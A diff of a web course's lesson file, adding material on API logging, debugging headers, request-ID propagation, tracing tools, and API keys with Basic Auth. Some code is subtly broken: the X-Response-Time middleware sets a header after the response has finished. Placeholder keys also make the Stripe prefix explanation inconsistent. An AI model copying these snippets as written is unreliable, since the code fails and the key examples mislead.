+- Bank account numbers
+- Passwords reset tokens
+
+Personally Identifiable Information (PII):
+- Email addresses (in some jurisdictions)
+- Phone numbers
+- Physical addresses
+- Date of birth
+- Health information
+
+Why NEVER?
+1. Security: Logs often stored without encryption
+2. Compliance: GDPR, PCI-DSS, HIPAA violations
+3. Access: Many people have log access (devs, ops, support)
+4. Retention: Logs kept long-term, data lingers
+5. Third-party: Logs sent to external services (Datadog, Splunk)</div>
+
+                            <h3>Structured Logging</h3>
+
+                            <div class="code-block">Use JSON format for machine-parseable logs
+
+❌ BAD: Unstructured string logs
+"User 123 created order 456 at 2024-01-15 10:30:00"
+→ Hard to search, parse, filter
+
+✅ GOOD: Structured JSON logs
+{
+  "timestamp": "2024-01-15T10:30:00.123Z",
+  "level": "INFO",
+  "message": "Order created",
+  "request_id": "req_abc123",
+  "user_id": "123",
+  "order_id": "456",
+  "method": "POST",
+  "path": "/api/orders",
+  "status": 201,
+  "duration_ms": 234,
+  "ip": "192.168.1.1"
+}
+
+Benefits:
+✅ Easy to search (filter by user_id, status, etc.)
+✅ Easy to parse (JSON → structured data)
+✅ Easy to analyze (aggregate by status, average duration)
+✅ Compatible with log aggregation tools (ELK, Splunk)
+
+// Node.js example with Winston
+const winston = require('winston');
+
+const logger = winston.createLogger({
+  format: winston.format.json(),
+  transports: [
+    new winston.transports.File({ filename: 'api.log' })
+  ]
+});
+
+app.use((req, res, next) => {
+  const start = Date.now();
+
+  res.on('finish', () => {
+    logger.info({
+      request_id: req.id,
+      method: req.method,
+      path: req.path,
+      status: res.statusCode,
+      duration_ms: Date.now() - start,
+      user_id: req.user?.id
+    });
+  });
+
+  next();
+});</div>
+
+                            <h3>Log Levels</h3>
+
+                            <div class="code-block">Use appropriate log levels
+
+DEBUG: Detailed info for debugging (disable in production)
+- Variable values
+- Function entry/exit
+- Conditional branches taken
+Example: "Checking if user 123 has permission to delete order 456"
+
+INFO: Normal operational messages
+- Request started/completed
+- User actions
+- Background jobs
+Example: "User 123 created order 456"
+
+WARN: Unexpected but handled situations
+- Deprecated API usage
+- Approaching rate limits
+- Fallback to defaults
+- Recoverable errors
+Example: "API key sk_test_*** will expire in 7 days"
+
+ERROR: Error conditions requiring attention
+- Failed requests (5xx)
+- Database errors
+- External service failures
+- Unhandled exceptions
+Example: "Database connection failed: timeout after 30s"
+
+FATAL: Critical errors, system going down
+- Out of memory
+- Cannot connect to critical service
+- Data corruption detected
+Example: "Cannot connect to database, shutting down"
+
+Production settings:
+- Log level: INFO (or WARN for high-traffic APIs)
+- DEBUG disabled (too verbose, performance impact)
+- Errors always logged, regardless of level</div>
+
+                            <h3>Request ID Correlation</h3>
+
+                            <div class="code-block">Use Request ID to track requests across services
+
+// Generate request ID
+const { v4: uuidv4 } = require('uuid');
+
+app.use((req, res, next) => {
+  // Use existing request ID from client or generate new
+  req.id = req.headers['x-request-id'] || uuidv4();
+
+  // Include in response headers
+  res.setHeader('X-Request-ID', req.id);
+
+  next();
+});
+
+// Include in all logs
+logger.info({
+  request_id: req.id,
+  message: 'User login',
+  user_id: 123
+});
+
+// Pass to downstream services
+async function callUserService(userId) {
+  const response = await fetch(\`\${USER_SERVICE_URL}/users/\${userId}\`, {
+    headers: {
+      'X-Request-ID': req.id  // ← Propagate request ID
+    }
+  });
+  return response.json();
+}
+
+Benefits:
+✅ Track single request across multiple services
+✅ Correlate logs from different systems
+✅ Debugging microservices (find which service failed)
+✅ Customer support (ask for request ID from error message)
+
+Example flow:
+1. Client → API Gateway [req_abc123]
+2. API Gateway → Auth Service [req_abc123]
+3. Auth Service → Database [req_abc123]
+4. Database logs: "Query failed [req_abc123]"
+5. Search all logs for "req_abc123" → see entire request path</div>
+
+                            <h2>Debugging Headers</h2>
+
+                            <h3>X-Request-ID</h3>
+
+                            <div class="code-block">Request ID for tracking
+
+Request:
+GET /api/users/123
+X-Request-ID: req_abc123def456
+
+Response:
+HTTP/1.1 200 OK
+X-Request-ID: req_abc123def456
+{"id": 123, "name": "Alice"}
+
+Error response includes request ID:
+{
+  "error": {
+    "code": "USER_NOT_FOUND",
+    "message": "User not found",
+    "request_id": "req_abc123def456"  ← For support
+  }
+}
+
+Customer: "I got an error!"
+Support: "What's the request ID?"
+Customer: "req_abc123def456"
+Support: *searches logs* → finds exact error and context</div>
+
+                            <h3>X-Response-Time</h3>
+
+                            <div class="code-block">Performance debugging header
+
+Response:
+HTTP/1.1 200 OK
+X-Response-Time: 234ms
+
+Implementation:
+app.use((req, res, next) => {
+  const start = Date.now();
+
+  res.on('finish', () => {
+    const duration = Date.now() - start;
+    res.setHeader('X-Response-Time', \`\${duration}ms\`);
+  });
+
+  next();
+});
+
+Helps identify slow endpoints:
+GET /api/search → X-Response-Time: 3456ms  ← Too slow!
+GET /api/users/123 → X-Response-Time: 23ms  ← Fast</div>
+
+                            <h3>Server-Timing API</h3>
+
+                            <div class="code-block">Detailed performance breakdown
+
+Response:
+HTTP/1.1 200 OK
+Server-Timing: db;dur=150, cache;dur=5, total;dur=234
+
+Server-Timing:
+  db;desc="Database";dur=150,
+  redis;desc="Cache";dur=5,
+  stripe;desc="Payment API";dur=78,
+  total;dur=234
+
+Implementation:
+const timings = {};
+
+timings.dbStart = Date.now();
+const user = await db.users.findOne({ id: userId });
+timings.dbEnd = Date.now();
+
+timings.cacheStart = Date.now();
+const cached = await redis.get(\`user:\${userId}\`);
+timings.cacheEnd = Date.now();
+
+res.setHeader('Server-Timing', \`
+  db;dur=\${timings.dbEnd - timings.dbStart},
+  cache;dur=\${timings.cacheEnd - timings.cacheStart}
+\`);
+
+Browser DevTools shows this breakdown automatically!
+Helps identify bottlenecks (DB slow? Cache slow? External API slow?)</div>
+
+                            <h2>Error Context</h2>
+
+                            <h3>Stack Traces</h3>
+
+                            <div class="code-block">Log stack traces server-side, NEVER expose to clients
+
+❌ BAD: Exposing stack trace to client
+{
+  "error": "NullPointerException at UserService.java:42\n at OrderController.java:123\n ..."
+}
+→ Exposes internal structure, file paths, code
+
+✅ GOOD: Log internally, generic message to client
+
+// Server-side error handler
+app.use((err, req, res, next) => {
+  // Log full error with stack trace
+  logger.error({
+    request_id: req.id,
+    error: err.message,
+    stack: err.stack,  // ← Only in logs
+    method: req.method,
+    path: req.path,
+    user_id: req.user?.id
+  });
+
+  // Return generic error to client
+  res.status(500).json({
+    error: {
+      code: 'INTERNAL_SERVER_ERROR',
+      message: 'An unexpected error occurred',
+      request_id: req.id  // ← For support lookup
+    }
+  });
+});
+
+Development mode: Can return stack trace
+if (process.env.NODE_ENV === 'development') {
+  res.json({ error: err.message, stack: err.stack });
+}</div>
+
+                            <h3>Request Context</h3>
+
+                            <div class="code-block">Include context in error logs
+
+{
+  "timestamp": "2024-01-15T10:30:00.123Z",
+  "level": "ERROR",
+  "error": "Database connection timeout",
+  "stack": "Error: timeout\n at Database.connect...",
+  "request_id": "req_abc123",
+  "user_id": "123",
+  "method": "POST",
+  "path": "/api/orders",
+  "query": {"include": "items"},
+  "ip": "192.168.1.1",
+  "user_agent": "Mozilla/5.0...",
+  "api_version": "v1",
+  "environment": "production",
+  "region": "us-east-1",
+  "server": "api-server-3"
+}
+
+Context helps debug:
+- User-specific issue? (user_id: 123)
+- Endpoint-specific? (path: /api/orders)
+- Region-specific? (region: us-east-1)
+- Server-specific? (server: api-server-3)</div>
+
+                            <h2>Tools & Techniques</h2>
+
+                            <h3>curl for Debugging</h3>
+
+                            <div class="code-block">curl: Command-line tool for API testing
+
+Basic request:
+$ curl https://api.example.com/users/123
+
+See headers (-i includes response headers):
+$ curl -i https://api.example.com/users/123
+
+Verbose output (-v shows request + response):
+$ curl -v https://api.example.com/users/123
+
+POST with JSON body:
+$ curl -X POST https://api.example.com/users \\
+  -H "Content-Type: application/json" \\
+  -d '{"name":"Alice","email":"alice@example.com"}'
+
+Include auth token:
+$ curl -H "Authorization: Bearer eyJhbGc..." \\
+  https://api.example.com/orders
+
+Save response to file:
+$ curl https://api.example.com/users/123 -o user.json
+
+Follow redirects:
+$ curl -L https://api.example.com/redirect
+
+Show only headers:
+$ curl -I https://api.example.com/users/123
+
+Test response time:
+$ curl -w "@curl-format.txt" -o /dev/null -s https://api.example.com/users/123
+
+# curl-format.txt:
+time_total: %{time_total}s
+time_connect: %{time_connect}s
+time_starttransfer: %{time_starttransfer}s</div>
+
+                            <h3>Postman / Insomnia</h3>
+
+                            <div class="code-block">GUI tools for API testing
+
+Postman features:
+✅ Save requests in collections
+✅ Environment variables (dev, staging, prod)
+✅ Pre-request scripts (generate auth tokens)
+✅ Tests (assert response status, body)
+✅ Mock servers
+✅ API documentation generation
+✅ Team collaboration
+
+Insomnia features:
+✅ GraphQL support
+✅ gRPC support
+✅ Environment templates
+✅ Code generation (curl, Node.js, Python)
+✅ Response filtering (JSONPath, XPath)
+
+Example Postman test:
+pm.test("Status is 200", function() {
+  pm.response.to.have.status(200);
+});
+
+pm.test("Response has user", function() {
+  const json = pm.response.json();
+  pm.expect(json.user.id).to.equal(123);
+});</div>
+
+                            <h3>Browser DevTools</h3>
+
+                            <div class="code-block">Use browser DevTools for web API debugging
+
+Network tab:
+1. Filter by XHR/Fetch (API requests only)
+2. Click request → Headers tab
+   - See request/response headers
+   - Copy as curl, fetch, Node.js
+3. Response tab → see response body
+4. Timing tab → see request breakdown (DNS, connection, waiting, download)
+5. Right-click → Copy → Copy as fetch/curl
+
+Console tab:
+// Intercept fetch requests
+const originalFetch = window.fetch;
+window.fetch = function(...args) {
+  console.log('Fetch:', args);
+  return originalFetch.apply(this, args)
+    .then(response => {
+      console.log('Response:', response);
+      return response;
+    });
+};
+
+Preserve log:
+✅ Check "Preserve log" to keep requests across page navigations
+
+Throttling:
+→ Network tab → Throttling dropdown
+→ Simulate slow 3G, offline, custom speeds
+→ Test API behavior on slow connections</div>
+
+                            <h3>HTTPie</h3>
+
+                            <div class="code-block">HTTPie: User-friendly curl alternative
+
+Installation:
+$ pip install httpie
+
+Basic request (method auto-detected):
+$ http https://api.example.com/users/123
+
+POST JSON (automatic):
+$ http POST https://api.example.com/users name=Alice email=alice@example.com
+
+Headers:
+$ http https://api.example.com/users Authorization:"Bearer token123"
+
+Download file:
+$ http --download https://api.example.com/file.pdf
+
+Follow redirects:
+$ http --follow https://api.example.com/redirect
+
+Pretty-print JSON:
+$ http https://api.example.com/users | jq .
+
+Session (persist cookies, auth):
+$ http --session=logged-in POST https://api.example.com/login user=alice pass=secret
+$ http --session=logged-in GET https://api.example.com/profile
+
+Colored, formatted output:
+✅ Syntax highlighting
+✅ JSON pretty-print
+✅ More readable than curl</div>
+
+                            <h2>Distributed Tracing</h2>
+
+                            <h3>Trace IDs Across Microservices</h3>
+
+                            <div class="code-block">Track requests across multiple services
+
+Request flow:
+Client → API Gateway → Auth Service → User Service → Database
+
+Without tracing:
+→ Hard to tell which service failed
+→ Can't measure end-to-end latency
+→ Can't find performance bottlenecks
+
+With trace ID:
+1. API Gateway generates trace ID: trace_abc123
+2. Passes to Auth Service in header: X-Trace-ID: trace_abc123
+3. Auth Service logs: [trace_abc123] Validating token
+4. Auth Service calls User Service with same trace ID
+5. User Service logs: [trace_abc123] Fetching user 123
+6. Database logs: [trace_abc123] Query: SELECT * FROM users WHERE id=123
+
+Search logs for "trace_abc123" → see entire request flow
+
+// Express middleware
+app.use((req, res, next) => {
+  req.traceId = req.headers['x-trace-id'] || uuidv4();
+  res.setHeader('X-Trace-ID', req.traceId);
+  next();
+});
+
+// Pass to downstream services
+fetch(userServiceUrl, {
+  headers: {
+    'X-Trace-ID': req.traceId
+  }
+});</div>
+
+                            <h3>OpenTelemetry & Jaeger</h3>
+
+                            <div class="code-block">Distributed tracing with OpenTelemetry
+
+OpenTelemetry = Standard for tracing, metrics, logs
+Jaeger = Tracing backend (visualize traces)
+
+// Setup OpenTelemetry
+const { NodeTracerProvider } = require('@opentelemetry/node');
+const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');
+
+const provider = new NodeTracerProvider();
+const exporter = new JaegerExporter({
+  endpoint: 'http://localhost:14268/api/traces'
+});
+
+provider.addSpanProcessor(new SimpleSpanProcessor(exporter));
+provider.register();
+
+// Auto-instrumentation
+require('@opentelemetry/auto-instrumentations-node/register');
+
+Automatic tracing of:
+✅ HTTP requests
+✅ Database queries
+✅ Redis calls
+✅ External API calls
+
+Jaeger UI shows:
+→ Timeline of entire request
+→ Each service as a span
+→ Duration of each operation
+→ Where time was spent
+→ Errors and logs
+
+Benefits:
+✅ Find slow services
+✅ Identify bottlenecks
+✅ Debug production issues
+✅ Optimize performance</div>
+
+                            <h2>Common Debugging Scenarios</h2>
+
+                            <div class="code-block">Scenario 1: Intermittent 500 errors
+
+Symptoms: Some requests fail with 500, no pattern
+Debug steps:
+1. Check logs for request IDs of failed requests
+2. Look for common pattern (same user? endpoint? time?)
+3. Check error messages and stack traces
+4. Compare successful vs failed requests
+5. Check external service status (DB, Redis, third-party APIs)
+
+Scenario 2: Slow API responses
+
+Symptoms: API taking 5+ seconds to respond
+Debug steps:
+1. Check X-Response-Time header
+2. Add Server-Timing headers to find bottleneck
+3. Check database query times (N+1 problem?)
+4. Check external API call times
+5. Enable query logging in development
+6. Use APM tool (New Relic, DataDog) for profiling
+
+Scenario 3: 401 Unauthorized errors
+
+Symptoms: Valid token returns 401
+Debug steps:
+1. Verify token format (JWT structure valid?)
+2. Check token expiration (exp claim)
+3. Verify signature (correct secret key?)
+4. Check Authorization header format (Bearer token?)
+5. Verify token not revoked/blacklisted
+6. Check clock skew (token issued in future?)
+
+Scenario 4: Missing data in response
+
+Symptoms: Expected field not in response
+Debug steps:
+1. Check API version (field added in newer version?)
+2. Verify query parameters (include=details)
+3. Check user permissions (field redacted for security?)
+4. Verify database has data
+5. Check serialization logic (field excluded?)</div>
+
+                            <h2>Summary</h2>
+
+                            <ul>
+                                <li><strong>Logging:</strong> Log method, URL, status, timing, user ID - NEVER log passwords, tokens, PII</li>
+                                <li><strong>Structured logs:</strong> Use JSON format for easy parsing, searching, and analysis</li>
+                                <li><strong>Log levels:</strong> DEBUG (detailed), INFO (normal), WARN (unexpected), ERROR (failures), FATAL (critical)</li>
+                                <li><strong>Request ID:</strong> Generate unique ID per request, propagate across services for correlation</li>
+                                <li><strong>Headers:</strong> X-Request-ID (tracking), X-Response-Time (performance), Server-Timing (detailed breakdown)</li>
+                                <li><strong>Stack traces:</strong> Log server-side with full context, never expose to clients</li>
+                                <li><strong>Tools:</strong> curl (CLI testing), Postman (GUI), HTTPie (user-friendly), Browser DevTools (web APIs)</li>
+                                <li><strong>Distributed tracing:</strong> Use trace IDs across microservices, OpenTelemetry + Jaeger for visualization</li>
+                                <li><strong>Error context:</strong> Include request details, user info, environment, region in error logs</li>
+                                <li><strong>Security:</strong> Mask/redact sensitive data in logs, comply with GDPR/PCI-DSS</li>
+                                <li><strong>Production debugging:</strong> Use request IDs for support, detailed logs for diagnosis, generic errors to clients</li>
                             </ul>
                         `,
                         interviews: [
                             {
                                 question: "What information should NEVER be logged in API requests and why?",
-                                answer: "OUTLINE: Never log: passwords, tokens, API keys, credit cards, SSNs, PII. Why: Logs are often stored insecurely, accessible by many people, sent to third-party services. Regulatory compliance (GDPR, PCI-DSS) prohibits logging sensitive data. Use masking/redaction for debugging."
+                                answer: "Never log: 1) Authentication (passwords, API keys, tokens, OAuth tokens, session IDs, Authorization headers), 2) Financial data (full credit card numbers, CVV codes, bank accounts - PCI-DSS violation), 3) PII (SSN, health info, in some cases email/phone - GDPR violation). Why: 1) Security: Logs often stored without encryption, accessible by many people (devs, ops, support), 2) Compliance: GDPR, PCI-DSS, HIPAA prohibit logging certain data, 3) Retention: Logs kept long-term, sensitive data lingers, 4) Third-party: Logs sent to external services (Datadog, Splunk), 5) Breach risk: If logs compromised, sensitive data exposed. Instead: 1) Mask sensitive fields (card: **** **** **** 1234), 2) Hash where needed (SHA256 of email for correlation), 3) Use user IDs not names/emails, 4) Redact tokens (show first 4 chars: sk_live_abcd...), 5) Log metadata only (token present: true, not actual token). For debugging: Use separate debug mode with extra logging, disabled in production."
+                            },
+                            {
+                                question: "How do you implement request ID propagation in a microservices architecture?",
+                                answer: "Request ID propagation pattern: 1) Generate: API Gateway generates unique ID (UUID) or accepts X-Request-ID from client, 2) Include in response: res.setHeader('X-Request-ID', requestId), 3) Log: Include in all logs { request_id: 'req_abc123', message: '...', ... }, 4) Propagate: Pass to downstream services in headers: fetch(url, { headers: { 'X-Request-ID': req.id } }), 5) Middleware: Each service extracts from header or generates if missing. Implementation: app.use((req, res, next) => { req.id = req.headers['x-request-id'] || uuidv4(); res.setHeader('X-Request-ID', req.id); next(); }). Benefits: 1) Track single request across all services, 2) Correlate logs from different systems (search for req_abc123), 3) Debugging microservices (find which service failed), 4) Customer support (include request ID in error messages). Example flow: Client → Gateway [req_123] → Auth [req_123] → User Service [req_123] → Database [req_123]. Search all logs for 'req_123' to see entire request path and timing. Standards: X-Request-ID (common) or X-Trace-ID (OpenTelemetry uses trace IDs with span IDs for hierarchical tracing)."
+                            },
+                            {
+                                question: "How do you debug production API issues without exposing internal details to clients?",
+                                answer: "Production debugging pattern: 1) Two-tier errors: Log detailed error server-side, return generic message to client. Server log: { error: 'Database timeout', stack: '...', query: 'SELECT...', request_id: 'req_123' }, Client response: { error: { code: 'INTERNAL_SERVER_ERROR', message: 'An error occurred', request_id: 'req_123' } }. 2) Request ID: Include in error response so support can look up details: 'Please contact support with request ID: req_123'. 3) Error codes: Use generic codes (INTERNAL_SERVER_ERROR) not specific (DATABASE_TIMEOUT_IN_USER_TABLE). 4) Stack traces: Never expose to clients, log server-side only. 5) Environment check: if (process.env.NODE_ENV === 'development') { return stack trace } else { return generic error }. 6) Structured logging: Log full context { request_id, user_id, endpoint, params, error, stack, duration, ip, user_agent }. 7) Monitoring: Use APM tools (New Relic, DataDog) to see errors in real-time with context. 8) Debugging: Search logs by request ID, trace ID, user ID to find root cause. 9) Alerts: Set up alerts for error rate spikes, specific errors. Best practice: Detailed logs + request ID for correlation + generic client errors = secure debugging."
+                            },
+                            {
+                                question: "What is distributed tracing and how does it help debug microservices?",
+                                answer: "Distributed tracing tracks a request's journey across multiple microservices with timing for each step. Components: 1) Trace ID: Unique ID for entire request flow, 2) Span ID: Unique ID for each service/operation, 3) Parent Span ID: Links spans hierarchically. Example flow: Client → API Gateway (span1) → Auth Service (span2, parent: span1) → User Service (span3, parent: span1) → Database (span4, parent: span3). Each span records: service name, operation name, start time, duration, status, tags, logs. Benefits: 1) Visualize request flow (see which services called), 2) Find bottlenecks (which service is slow?), 3) Debug failures (which service errored?), 4) Measure latency (end-to-end and per-service), 5) Dependencies (service call graph). Implementation: OpenTelemetry (standard) + backend (Jaeger, Zipkin, Datadog). Auto-instrumentation traces: HTTP requests, database queries, Redis calls, external APIs. Jaeger UI shows: Timeline waterfall with each service as row, total duration, individual span durations, errors highlighted. Use case: 'API slow' → check trace → see 'User Service taking 3s' → drill down → see 'Database query taking 2.9s' → optimize query. Without tracing: would need to manually correlate logs across services, hard to see timing breakdown."
+                            },
+                            {
+                                question: "What are the benefits of structured logging over plain text logs?",
+                                answer: "Structured logging (JSON format) vs plain text: Plain text: 'User 123 created order 456 at 2024-01-15 10:30:00 status 201 in 234ms'. Structured: { timestamp: '2024-01-15T10:30:00.123Z', level: 'INFO', message: 'Order created', user_id: 123, order_id: 456, status: 201, duration_ms: 234 }. Benefits: 1) Searchable: Filter by specific fields (find all user_id=123, all status=500), plain text requires regex, 2) Parseable: JSON → structured data, easy to process programmatically, 3) Aggregatable: Calculate avg duration_ms, count by status, plain text needs complex parsing, 4) Tool compatible: Works with ELK stack, Splunk, Datadog out of box, 5) Queryable: SELECT AVG(duration_ms) WHERE status >= 500, 6) Type safe: duration_ms is number, timestamp is date (not string). Use cases: Structured enables: 'Show all 500 errors for user 123 in last hour', 'Average response time per endpoint', 'Count errors by error code', 'Find slowest requests (duration_ms > 1000)'. Plain text requires: Complex regex, manual parsing, custom scripts. Implementation: Use logging library (Winston, Bunyan, Pino) with JSON format. Include context: request_id, user_id, method, path, status, duration, error, stack. Index logs in Elasticsearch for searching/aggregation. Cost: Slightly larger log size (field names repeated), but worth it for searchability."
+                            },
+                            {
+                                question: "How do you use the Server-Timing API to debug API performance?",
+                                answer: "Server-Timing API = HTTP response header with performance metrics breakdown. Header format: Server-Timing: db;dur=150, cache;dur=5, external;dur=78, total;dur=234. Detailed format: Server-Timing: db;desc='Database';dur=150, cache;desc='Redis Cache';dur=5, stripe;desc='Payment API';dur=78. Implementation: 1) Track timing for each operation: const timings = {}; timings.dbStart = Date.now(); const user = await db.findOne({ id }); timings.dbDur = Date.now() - timings.dbStart. 2) Set header: res.setHeader('Server-Timing', `db;dur=${timings.dbDur}, cache;dur=${timings.cacheDur}`). 3) Browser DevTools automatically shows this in Network tab → Timing section. Benefits: 1) Find bottlenecks (which operation is slow?), 2) Client-visible (no need for server logs), 3) Per-request breakdown (not just total), 4) Browser integration (shows in DevTools), 5) Production debugging (enabled in prod). Example: 'API taking 2s' → check Server-Timing → see 'external;dur=1800' → external API is bottleneck → cache or optimize external calls. Use cases: Database queries, cache lookups, external API calls, serialization, authentication. Real example: Server-Timing: db;dur=23, auth;dur=5, serialize;dur=12, total;dur=45. Shows: total 45ms (fast), DB 23ms (biggest chunk), auth 5ms (fast), serialize 12ms (medium). Without: Only know total 45ms, not where time spent. Enable in development and production for debugging performance issues."
                             }
                         ]
                     }
@@ -14788,194 +16037,2622 @@ validator.isEmail(email);  // Tested, safe regex</div>
                         title: 'API Keys & Basic Auth',
                         duration: '45 min',
                         content: `
-                            <h2>OUTLINE: API Keys & Basic Auth</h2>
+                            <h2>API Key Authentication</h2>
+                            <p>API keys are simple tokens used to authenticate API requests. They're the most basic form of API authentication and widely used for server-to-server communication and developer APIs.</p>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>API Key Authentication</strong>
-                                    - What are API keys and when to use them
-                                    - Key generation (UUIDs, random strings)
-                                    - Key formats (prefixes for identification: sk_live_, pk_test_)
-                                    - Storage (hashing, never plain text)
-                                    - Transmission (headers vs query params)
-                                </li>
-                                <li><strong>Basic Authentication</strong>
-                                    - How Basic Auth works (base64 encoding)
-                                    - Security concerns (HTTPS required)
-                                    - Use cases (simple APIs, internal services)
-                                    - Comparison with API keys
-                                </li>
-                                <li><strong>Best Practices</strong>
-                                    - Key rotation strategies
-                                    - Multiple keys per user (separate keys for different services)
-                                    - Key scoping (read-only vs read-write)
-                                    - Rate limiting per key
-                                    - Key revocation
-                                </li>
-                                <li><strong>Security Considerations</strong>
-                                    - Always use HTTPS
-                                    - Don't put keys in URLs (logged, cached)
-                                    - Environment variables, not code
-                                    - Key compromise detection
-                                </li>
-                            </ul>
+                            <h3>What Are API Keys?</h3>
+                            <div class="code-block">API Key = Long random string that identifies and authenticates the caller
 
-                            <h3>Examples to Include:</h3>
+Example:
+your_live_keydef456...
+
+Typical flow:
+1. Developer signs up → Platform generates API key
+2. Developer includes key in API requests
+3. Server validates key → Identifies user → Authorizes request
+
+Similar to: A password that never expires (unless rotated)</div>
+
+                            <h3>When to Use API Keys</h3>
+                            <div class="code-block">✅ GOOD use cases:
+- Server-to-server communication (backend to backend)
+- Identifying applications (not individual users)
+- Rate limiting and quota management
+- Simple authentication for internal APIs
+- Third-party integrations (Stripe, SendGrid)
+- Developer tools and CLIs
+
+❌ DON'T use for:
+- User authentication (use OAuth, JWT instead)
+- Web browsers (keys get exposed)
+- Mobile apps (keys can be extracted from app)
+- Fine-grained permissions (use OAuth scopes instead)
+
+Why? API keys represent the app, not the user.
+Can't do per-user authorization.</div>
+
+                            <h2>API Key Generation</h2>
+
+                            <h3>Generating Secure Keys</h3>
+                            <div class="code-block">// Node.js - Cryptographically secure random string
+const crypto = require('crypto');
+
+function generateAPIKey() {
+  return crypto.randomBytes(32).toString('hex');
+}
+
+// Example output:
+// a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456
+
+// UUID v4 (also good)
+const { v4: uuidv4 } = require('uuid');
+const apiKey = uuidv4();  // e.g., 550e8400-e29b-41d4-a716-446655440000
+
+Length: At least 32 bytes (256 bits) for security
+Format: Hex or Base64 for URL-safety</div>
+
+                            <h3>API Key Prefixes (Stripe Pattern)</h3>
+                            <div class="code-block">Prefix helps identify key type and environment
+
+Stripe's format:
+your_live_key...   // Secret key, production
+your_test_key...   // Secret key, test environment
+pk_live_your_key...   // Publishable key (safe to expose)
+pk_test_your_key...   // Publishable key, test
+
+Benefits:
+✅ Easy to identify key type at a glance
+✅ Different permissions (pk_ can only create charges)
+✅ Revoke all keys of one type (e.g., all test keys)
+✅ Prevent production keys in test environments
+
+Example format:
+<prefix>_<environment>_<random_string>
+
+// Implementation
+function generateAPIKey(type, environment) {
+  const random = crypto.randomBytes(32).toString('hex');
+  return \`\${type}_\${environment}_\${random}\`;
+}
+
+const secretKey = generateAPIKey('sk', 'live');
+const publishableKey = generateAPIKey('pk', 'test');</div>
+
+                            <h3>Storing API Keys Securely</h3>
+                            <div class="code-block">❌ NEVER store plain text keys in database!
+
+Example breach:
+Database leaked → Attacker has all keys → All accounts compromised
+
+✅ Hash keys before storing (like passwords)
+
+// When user creates API key
+const apiKey = generateAPIKey();
+const hashedKey = await bcrypt.hash(apiKey, 10);
+
+// Show key to user ONCE (like password reset)
+res.json({
+  apiKey: apiKey,  // User copies this
+  message: "Save this key! You won't see it again."
+});
+
+// Store hash in database
+await APIKey.create({
+  userId: user.id,
+  keyHash: hashedKey,
+  prefix: apiKey.substring(0, 8),  // For user reference
+  createdAt: new Date()
+});
+
+// When user makes API request
+const providedKey = req.headers['x-api-key'];
+const storedKey = await APIKey.findOne({ userId });
+const valid = await bcrypt.compare(providedKey, storedKey.keyHash);
+
+Alternative: Store hash of key, not full key
+const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');</div>
+
+                            <h2>Transmitting API Keys</h2>
+
+                            <h3>Header (Recommended)</h3>
+                            <div class="code-block">✅ BEST: Custom header
+GET /api/users
+X-API-Key: your_live_key...
+
+or
+
+Authorization: Bearer your_live_key...
+
+Why headers?
+✅ Not logged in URLs
+✅ Not cached by proxies
+✅ Not in browser history
+✅ Clean separation of auth and params
+
+Examples:
+// curl
+curl -H "X-API-Key: your_live_key..." https://api.example.com/users
+
+// JavaScript fetch
+fetch('https://api.example.com/users', {
+  headers: {
+    'X-API-Key': 'your_live_key...'
+  }
+});
+
+// Node.js axios
+axios.get('https://api.example.com/users', {
+  headers: {
+    'X-API-Key': 'your_live_key...'
+  }
+});</div>
+
+                            <h3>Query Parameter (Not Recommended)</h3>
+                            <div class="code-block">❌ AVOID: Query parameter
+GET /api/users?api_key=your_live_key...
+
+Problems:
+❌ Logged in server logs (visible to admins)
+❌ Cached by CDNs and proxies
+❌ Visible in browser history
+❌ Sent in Referer header to third-party sites
+❌ Visible in analytics tools
+
+Only acceptable for:
+- Read-only public data
+- Temporary one-time tokens
+- Legacy systems that can't use headers
+
+If you must use query params:
+- Use POST instead of GET (body, not URL)
+- Set Cache-Control: no-store
+- Use short-lived tokens</div>
+
+                            <h2>Basic Authentication</h2>
+
+                            <h3>How Basic Auth Works</h3>
+                            <div class="code-block">HTTP Basic Authentication: Username and password in header
+
+Format:
+Authorization: Basic <base64-encoded-credentials>
+
+Example:
+Username: user@example.com
+Password: secretpassword
+
+1. Combine: user@example.com:secretpassword
+2. Base64 encode: dXNlckBleGFtcGxlLmNvbTpzZWNyZXRwYXNzd29yZA==
+3. Send: Authorization: Basic dXNlckBleGFtcGxlLmNvbTpzZWNyZXRwYXNzd29yZA==
+
+Server decodes and validates credentials.
+
+// Node.js implementation
+const authHeader = req.headers['authorization'];
+if (!authHeader || !authHeader.startsWith('Basic ')) {
+  return res.status(401).json({ error: 'Unauthorized' });
+}
+
+const base64Credentials = authHeader.split(' ')[1];
+const credentials = Buffer.from(base64Credentials, 'base64').toString('utf-8');
+const [username, password] = credentials.split(':');
+
+// Validate
+const user = await User.findOne({ username });
+if (!user || !await bcrypt.compare(password, user.passwordHash)) {
+  return res.status(401).json({ error: 'Invalid credentials' });
+}
+
+// curl example
+curl -u user@example.com:secretpassword https://api.example.com/users
+
+// or manually
+curl -H "Authorization: Basic dXNlc...==" https://api.example.com/users</div>
+
+                            <h3>Basic Auth Security</h3>
+                            <div class="code-block">⚠️ WARNING: Base64 is NOT encryption!
+
+Anyone can decode:
+dXNlckBleGFtcGxlLmNvbTpzZWNyZXRwYXNzd29yZA==
+↓
+user@example.com:secretpassword
+
+Basic Auth over HTTP = Sending password in plain text!
+
+✅ ONLY use with HTTPS
+https://api.example.com  ✅
+http://api.example.com   ❌ Never!
+
+Additional security:
+- Rate limit login attempts
+- Use strong passwords
+- Implement account lockout
+- Log authentication attempts
+- Consider API keys or OAuth instead</div>
+
+                            <h3>When to Use Basic Auth</h3>
+                            <div class="code-block">✅ Good for:
+- Internal tools and scripts
+- Service-to-service communication (with HTTPS)
+- Simple admin interfaces
+- Prototyping (quick to implement)
+- Legacy system compatibility
+
+❌ Not suitable for:
+- Public-facing web applications (use OAuth/JWT)
+- Mobile apps (credentials can be extracted)
+- Third-party integrations (use API keys)
+- Long-lived sessions (credentials sent every request)
+
+Modern alternative: API keys or OAuth</div>
+
+                            <h2>API Keys vs Basic Auth Comparison</h2>
+
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Aspect</th>
+                                        <th>API Keys</th>
+                                        <th>Basic Auth</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Credentials</strong></td>
+                                        <td>Single token</td>
+                                        <td>Username + Password</td>
+                                    </tr>
